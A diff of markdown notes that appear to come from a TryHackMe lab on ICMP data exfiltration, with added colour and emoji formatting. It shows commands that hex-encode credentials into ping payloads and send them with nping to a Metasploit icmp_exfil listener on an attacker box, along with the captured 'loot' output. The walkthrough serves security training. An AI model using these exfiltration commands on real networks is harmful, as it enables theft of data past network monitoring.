@@ -9,21 +9,33 @@
 - other red test
 + other green test
 ````
-this is
-````diff
-- oneWord
-````
-$${\color{red}Red?}$$
-$${\color{red}`Red??`}$$
-$${\color{red}**Red???**}$$
-$${\color{red}**`Red???`**}$$
-#rgb[Text using 3 chars notation (red = f00)]
+🔴🟢🟡                        
+$${\color{green}&#9679;}$$  
+$${\color{yellow}&#9679;}$$  
+$${\color{red}&#9679;}$$  
+$${\color{red}Red?}$$  
+$${\color{green}Red?}$$  
+$${\color{blue}Red?}$$  
+${\color{orange}RedRed}$  
+$`{\color{purple}blue-white}`$  
+${\color{pink}blue-green}$  
+${\color{white}blue-yellow}$  
+${\color{green}\`blue-yellow``}$  
+$`{\color{red} ping }`$  
+$`{\color{red} ping }`$  
 
+ $${\color{red}&#9679;}$$&nbsp;$${\color{green}&#9679;}$$&nbsp;$${\color{yellow}&#9679;}$$
+ $${\color{red}&#9679}$$$$&nbsp;$$$${\color{green}&#9679}$$$$&nbsp;$$$${\color{yellow}&#9679}$$
+
+$${\color{green}&#9679;}$$  
+$${\color{yellow}&#9679;}$$  
+$${\color{red}&#9679;}$$
+$${\color{red}&#9679}$$$${\color{red}&#9679;}$$$${\color{red}&#9679;}$$
 
 
 In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for **I**nternet **C**ontrol **M**essage **P**rotocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the following THM room: [What is Networking](https://tryhackme.com/room/whatisnetworking) or visit: https://tryhackme.com/room/whatisnetworking. 
 
-Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the **`ping`** command to send **`ICMP`** packets through the network, as shown in the figure below:
+Network devices such as routers use **`ICMP`** to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the $`{\color{red}`PING`}`$ command to send **`ICMP`** packets through the network, as shown in the figure below:
 
 ![image](https://github.com/user-attachments/assets/a4cbaf82-22f5-42df-aa28-3b03d4666d31)
 #### ICMP Request and Reply Diagram  
@@ -42,13 +54,13 @@ Note that the Data field is optional and could either be empty or it could conta
 To perform manual ICMP data exfiltration, we need to discuss the **`ping`** command a bit more. The **`ping`** command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending **`ICMP`** packets, which can be used as follows:
 
 ```bash
-#Sending one ICMP packet using the PING Command:
+🔴🟢🟡                        #Sending one ICMP packet using the PING Command:
 thm@AttackBox$ ping 10.10.144.103 -c 1
 ```
   
-We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like:
-<br>
-![image](https://github.com/user-attachments/assets/f858202c-bfcd-4c98-a455-66006c8f6d7d) 
+We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like:  
+
+![image](https://github.com/user-attachments/assets/f858202c-bfcd-4c98-a455-66006c8f6d7d)
 ###### Showing the Data Field value in Wireshark Diagram
   
 The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine. 
@@ -61,7 +73,7 @@ The ping command in the Linux OS has an interesting ICMP option. With the -p arg
 Let's say that we need to exfiltrate the following credentials **`thm:tryhackme`**. First, we need to convert it to its Hex representation and then pass it to the **`ping`** command using **`-p`** options as follows,
 
 ```bash
-#Using the xxd command to convert text to Hex:
+🔴🟢🟡                        #Using the xxd command to convert text to Hex:
 root@AttackBox$ echo "thm:tryhackme" | xxd -p 74686d3a7472796861636b6d650a
 ```
 
@@ -69,11 +81,11 @@ root@AttackBox$ echo "thm:tryhackme" | xxd -p 74686d3a7472796861636b6d650a
 We used the **`xxd`** command to convert our string to Hex, and then we can use the **`ping`** command with the Hex value we got from converting the **`thm:tryhackme`**.
 
 ```bash
-#Send Hex using the ping command:
+🔴🟢🟡                        #Send Hex using the ping command:
 root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
 ```
 
-##### **or for a one-liner:**
+##### :star: :star: :star: **or for a one-liner:** :star: :star: :star:
 ```bash
 ping -c 1 192.198.1.5 -p $(echo -n "test" | xxd -p)
 ```
@@ -83,7 +95,7 @@ We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Le
 ![image](https://github.com/user-attachments/assets/31800a6e-1ce0-4b93-b8b2-b87be4c2cd94)
 #### Checking Data Field in Wireshark Screenshot
 
-Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the **`ping`** command.
+:tada: Excellent! :tada: We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the **`ping`** command. :rocket:
 
   
 ## ICMP Data Exfiltration
@@ -97,7 +109,7 @@ Now that we have the basic fundamentals of manually sending data over ICMP packe
 Now from the AttackBox, let's set up the Metasploit framework by selecting the **`<red>icmp_exfil</red>`** module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the <red>**`BPF_FILTER`**</red> option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as <red>follows</red>:
 
 ```bash
-#Set the BPF_FILTER in MSF:
+🔴🟢🟡                        #Set the BPF_FILTER in MSF:
 msf5 > use auxiliary/server/icmp_exfil
 msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
 BPF_FILTER => icmp and not src ATTACKBOX_IP
@@ -106,7 +118,7 @@ BPF_FILTER => icmp and not src ATTACKBOX_IP
 We also need to select which network interface to listen to, **`eth0`**. Finally, <red>executes</red> run to start the module.
 
 ```bash
-#Set the interface in MSF
+🔴🟢🟡                        #Set the interface in MSF
 msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
 INTERFACE => eth0
 msf5 auxiliary(server/icmp_exfil) > run
@@ -122,7 +134,7 @@ We have preinstalled the **`nping`** tool, an open-source tool for network packe
 First, we will send the **`BOF trigger`** from the ICMP machine so that the Metasploit framework starts writing to the disk. 
 
 ```bash
-                          #Sending the Trigger Value from the Victim
+🔴🟢🟡                        #Sending the Trigger Value from the Victim
 thm@jump-box$ ssh thm@icmp.thm.com
 thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
     
@@ -136,14 +148,14 @@ Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
 Nping done: 1 IP address pinged in 1.06 seconds
 ```
 
-We sent one ICMP packet using the **`nping`*** command with **`--data-string`** argument. We specify the trigger value with the file name **`BOFfile.txt`**, set by default in the Metasploit framework. This could be changed from Metasploit if needed!
+We sent one ICMP packet using the **`nping`*** command with **`--data-string`** argument. We specify the trigger value with the file name **`BOFfile.txt`**, set by default in the Metasploit framework. This could be changed from Metasploit if needed!  
 
 Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk. 
 
 Let's start sending the required data and the end of the file trigger value from the ICMP machine.
 
 ```bash
-                        #Sending the Data and the End of the File Trigger Value
+🔴🟢🟡                        #Sending the Data and the End of the File Trigger Value
 thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
     
 Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
@@ -180,7 +192,8 @@ thm@icmp-host:~#
 ```
 Let's check our AttackBox once we have done sending the data and the ending trigger value.
 
-Receiving Data in MSF
+```bash
+🔴🟢🟡                        #Receiving Data in MSF
 msf5 auxiliary(server/icmp_exfil) > run
     
 [*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
@@ -190,7 +203,9 @@ msf5 auxiliary(server/icmp_exfil) > run
 [+] End of File received. Saving "file.txt" to loot
 [+] Incoming file "file.txt" saved to loot
 [+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
-Nice! We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.
+```
+
+:tada: Nice! :tada: We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.
 
 ICMP C2 Communication
 
